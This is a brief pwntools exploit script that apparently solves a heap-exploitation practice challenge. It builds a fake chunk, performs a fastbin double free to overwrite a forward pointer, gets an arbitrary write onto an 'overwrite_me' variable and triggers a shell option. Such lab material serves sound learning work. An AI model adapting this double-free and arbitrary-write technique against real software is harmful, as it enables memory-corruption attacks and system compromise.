# fastbin_dup2.py 
from pwn import *
p = process("./fastbin_dup_1")
def add(data):
	p.sendlineafter(">","1")
	p.sendlineafter(":",str(data))
def free(idx):
	p.sendlineafter(">","2")
	p.sendlineafter(":",str(idx))
def getshell():
	p.sendlineafter(">","3")
elf = ELF('fastbin_dup_1')
fakechunk = p64(0)
fakechunk += p64(0x31)
p.sendlineafter("Name :", fakechunk)
add("AAAA") # 0
add("AAAA") # 1 
free(0)
free(1)
free(0)
overwrite_me_addr = elf.symbols['overwrite_me']
fake_chunk_name = elf.symbols['name']
add(p64(fake_chunk_name)) # 0x602010 : FD overwrite
add("AAAA") # 0x602030
add("BBBB") # 0x602010
add(p64(0xDEADBEEF)) # Arbitrary allocate, write
getshell()
p.interactive()